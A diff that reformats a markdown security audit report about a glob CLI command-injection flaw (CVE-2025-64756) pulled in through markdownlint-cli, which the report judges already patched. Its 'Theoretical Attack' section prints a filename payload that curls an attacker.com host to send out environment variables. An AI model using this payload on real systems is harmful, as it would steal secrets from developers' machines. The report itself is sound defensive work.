@@ -8,7 +8,7 @@
 
 ## Executive Summary
 
-NPM audit identified **1 HIGH severity vulnerability** in the `glob` package (CVE-2025-64756), a transitive dependency through `markdownlint-cli`. 
+NPM audit identified **1 HIGH severity vulnerability** in the `glob` package (CVE-2025-64756), a transitive dependency through `markdownlint-cli`.
 
 **GOOD NEWS:** The project already has the patched version `glob@11.1.0` installed, so **no action is required**.
 
@@ -44,6 +44,7 @@ The glob CLI contains a command injection vulnerability in its `-c/--cmd` option
 5. ✅ **Dev-Only Tool:** markdownlint-cli is a devDependency, not in production
 
 **Verification:**
+
 ```bash
 # Confirmed glob version
 $ pnpm list glob
@@ -97,16 +98,19 @@ $ grep -r "glob -c" scripts/ package.json
 ### Theoretical Attack (from CVE):
 
 **1. Malicious Filename:**
+
 ```bash
-touch '$(curl https://attacker.com/steal?data=$(env))' 
+touch '$(curl https://attacker.com/steal?data=$(env))'
 ```
 
 **2. Running Vulnerable Command:**
+
 ```bash
 glob -c echo "**/*"  # Executes the filename as shell command
 ```
 
 **3. Result:**
+
 - Environment variables leaked to attacker
 - Arbitrary command execution
 
@@ -135,14 +139,14 @@ fixzit-frontend@2.0.26 (root)
 
 ## Remediation Status
 
-| Action | Status | Notes |
-|--------|--------|-------|
-| Identify vulnerability | ✅ Done | Found via pnpm audit |
-| Assess risk | ✅ Done | VERY LOW - not exploitable in this project |
-| Check installed version | ✅ Done | Already using patched 11.1.0 |
-| Update dependency | ✅ Done | Already patched |
-| Verify no CLI usage | ✅ Done | No `glob -c` usage found |
-| Re-run audit | ⚠️ Optional | Audit may still show warning due to markdownlint-cli's package.json |
+| Action                  | Status      | Notes                                                               |
+| ----------------------- | ----------- | ------------------------------------------------------------------- |
+| Identify vulnerability  | ✅ Done     | Found via pnpm audit                                                |
+| Assess risk             | ✅ Done     | VERY LOW - not exploitable in this project                          |
+| Check installed version | ✅ Done     | Already using patched 11.1.0                                        |
+| Update dependency       | ✅ Done     | Already patched                                                     |
+| Verify no CLI usage     | ✅ Done     | No `glob -c` usage found                                            |
+| Re-run audit            | ⚠️ Optional | Audit may still show warning due to markdownlint-cli's package.json |
 
 ---
 
@@ -157,6 +161,7 @@ The audit reports a vulnerability in `markdownlint-cli > glob@11.0.3` because:
 5. The **runtime is safe** even though the audit warning persists
 
 **Solution Options:**
+
 1. ✅ **Do Nothing:** Safe to ignore - already patched
 2. ⏸️ **Wait for markdownlint-cli update:** They will update their dependencies
 3. ⏸️ **Override in package.json:** Force glob@11.1.0+ (unnecessary, already working)
@@ -168,6 +173,7 @@ The audit reports a vulnerability in `markdownlint-cli > glob@11.0.3` because:
 **Stored at:** `qa/security/npm-audit-20251119.json`
 
 **Key Metrics:**
+
 - Total Dependencies: 1,400
 - Critical Vulnerabilities: 0
 - High Vulnerabilities: 1 (already patched in runtime)
@@ -184,6 +190,7 @@ The audit reports a vulnerability in `markdownlint-cli > glob@11.0.3` because:
 ✅ **APPROVED:** Safe to deploy with current dependency state
 
 **Reasoning:**
+
 1. Vulnerability is in glob CLI (not library API)
 2. Project doesn't use glob CLI anywhere
 3. Already using patched version 11.1.0
@@ -192,12 +199,14 @@ The audit reports a vulnerability in `markdownlint-cli > glob@11.0.3` because:
 ### For Future Maintenance:
 
 1. **Monitor markdownlint-cli Updates:**
+
    ```bash
    pnpm outdated markdownlint-cli
    # Update when new version available
    ```
 
 2. **Periodic Audits:**
+
    ```bash
    # Run monthly
    pnpm audit --json > qa/security/npm-audit-$(date +%Y%m%d).json
@@ -214,12 +223,12 @@ The audit reports a vulnerability in `markdownlint-cli > glob@11.0.3` because:
 
 ## Comparison with Previous Scans
 
-| Date | Tool | Critical | High | Moderate | Low | Status |
-|------|------|----------|------|----------|-----|--------|
-| Nov 17, 2025 | pnpm audit | 0 | 0 | 0 | 0 | ✅ Clean |
-| Nov 19, 2025 | pnpm audit | 0 | 1* | 0 | 0 | ✅ Patched |
+| Date         | Tool       | Critical | High | Moderate | Low | Status     |
+| ------------ | ---------- | -------- | ---- | -------- | --- | ---------- |
+| Nov 17, 2025 | pnpm audit | 0        | 0    | 0        | 0   | ✅ Clean   |
+| Nov 19, 2025 | pnpm audit | 0        | 1\*  | 0        | 0   | ✅ Patched |
 
-*Vulnerability flagged but already patched in runtime
+\*Vulnerability flagged but already patched in runtime
 
 ---
 
